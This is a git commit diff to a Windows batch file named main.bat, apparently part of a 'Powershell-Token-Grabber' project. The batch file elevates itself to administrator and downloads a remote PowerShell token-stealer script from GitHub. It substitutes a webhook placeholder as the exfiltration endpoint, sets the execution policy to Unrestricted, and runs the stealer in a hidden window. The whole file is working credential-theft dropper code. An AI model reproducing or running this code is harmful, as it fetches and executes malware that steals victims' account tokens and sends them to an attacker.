bd4a1e5c9dc79477377737571e49af09d20686fb
kdot227 <damndc227@gmail.com>
2023-05-19 15:25:43 -0500

    plz work

--- main.bat
+++ main.bat
@@ -4,9 +4,7 @@ net session >nul 2>&1
 if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
 cd /d %~dp0
 
-set "url=https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1"
-set "url2=YOUR_WEBHOOK_HERE2"
-powershell -c "$t = Iwr -Uri '%url%' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', '%url2%' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
+powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
 powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
 powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
 ::del powershell123.ps1 /f /q
